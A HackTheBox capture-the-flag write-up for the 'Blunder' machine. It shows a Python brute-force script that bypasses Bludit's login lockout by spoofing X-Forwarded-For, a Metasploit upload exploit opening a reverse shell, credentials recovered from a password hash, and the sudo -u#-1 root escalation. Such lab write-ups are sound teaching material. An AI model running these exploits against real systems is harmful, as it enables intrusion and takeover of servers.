---
title: "HTB: Blunder"
categories:
  - HackTheBox
tags:
  - HackTheBox
---

![Blunder](https://i.ibb.co/vzVkqtF/Blunder.png)

# Blunder

## Website Enumeration

A quick fuzz of the websites shows that the following page exists:

http://10.10.10.191/todo.txt
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

We'll keep the username "fergus" for later use. Additionally, an admin panel exists at http://10.10.10.191/admin. Since we don't have a password yet, we'll continue enumerating the site.

We can visit the Bludit Github repo for more info on the backend of the CMS. Several interesting folders are present, and looking through them presents us with the version of Bludit that this machine is running:

http://10.10.10.191/bl-plugins/opengraph/metadata.json
```
author	"Bludit"
email	""
website	"https://plugins.bludit.com"
version	"3.9.2"
releaseDate	"2019-06-21"
license	"MIT"
compatible	"3.9.2"
notes	""
```

To exploit the admin page, we can use cewl to get a wordlist, and modify the script found at the following url:

https://rastating.github.io/bludit-brute-force-mitigation-bypass/

cewl usage:
```
cewl -w wordlist http://blunder.htb
```

Modified Script:
```
#!/usr/bin/env python3
import re
import requests

host = 'http://blunder.htb'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = open('wordlist')

# Generate 50 incorrect passwords

# Add the correct password to the end of the list

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password.strip(),
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password.strip(),
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

We get the following credentials:

**fergus:RolandDeschain**

## Admin Panel Exploitation

Metasploit has a module dedicated to Bludit. We'll use linux/http/bludit_upload_images_exec to exploit the admin console and give ourselves a reverse shell:

```
use linux/http/bludit_upload_images_exec
set RHOSTS 10.10.10.191
set BLUDITUSER fergus
set BLUDITPASS RolandDeschain
run

[*] Started reverse TCP handler on 10.10.14.8:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading rQWQpOSGnt.png...
[*] Uploading .htaccess...
[*] Executing rQWQpOSGnt.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.xx.xx:4444 -> 10.10.10.191:55480) at 2020-06-01 11:03:14 -0500
[+] Deleted .htaccess
...
meterpreter > shell
Process 3329 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now, we can import tty:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Internal Enumeration

By doing some manual enumeration of the web-server folders, we can find the following hash in /var/www/bludit-3.10.0a/bl-content/databases/users.php:

```
...
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
...
```

Using hashes.org, we're able to easily decrypt this hash and gain the following credentials:

**Hugo:Password120**

## Enumeration as Hugo

First, we'll see if we can run anything as sudo:

```
sudo -l
Password: Password120

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

This means that we can sudo -u _user_ /bin/bash to switch to any user on the box, aside from root. Using the exploit for sudo 1.8.27, we can sudo to root, even though !root is set:

https://www.exploit-db.com/exploits/47502

```
sudo -u#-1 /bin/bash

root@blunder:/root# whoami
root
```



